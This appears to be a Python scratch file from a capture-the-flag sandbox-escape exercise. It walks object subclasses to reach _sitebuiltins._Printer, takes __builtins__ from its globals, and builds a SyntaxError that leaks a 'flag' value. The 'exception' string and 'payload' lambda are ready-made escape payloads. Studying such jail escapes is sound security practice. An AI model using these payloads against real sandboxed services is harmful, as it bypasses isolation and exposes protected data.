import sys
import _sitebuiltins

input = "a".__class__.__mro__[1].__subclasses__()
a = "a"

exc = _sitebuiltins._Printer.__init__.__globals__["__builtins__"]["SyntaxError"]

syntax = SyntaxError.__call__(a)


print(syntax)

def get_object(string):
    return [_ for _ in "a".__class__.__mro__[1].__subclasses__() if _.__module__ == "sys"][0]

flag = "ab"



printer = get_object("_Printer")

# print(printer)

# a = _sitebuiltins._Printer("teste", flag)
# a.__call__()

exception = "[_ for _ in 'a'.__class__.__mro__[1].__subclasses__() if _.__name__ == '_Printer'][0].__init__.__globals__['__builtins__']['SyntaxError'].__call__(flag)"

payload = (lambda: (_ for _ in ()).throw([_ for _ in 'a'.__class__.__mro__[1].__subclasses__() if _.__name__ == '_Printer'][0].__init__.__globals__['__builtins__']['SyntaxError'].__call__(flag)))()


# print(eval('[_ for _ in "a".__class__.__mro__[1].__subclasses__() if _.__name__ == "_Printer"][0].__init__.__globals__["__builtins__"]["SyntaxError"].__call__(flag)'))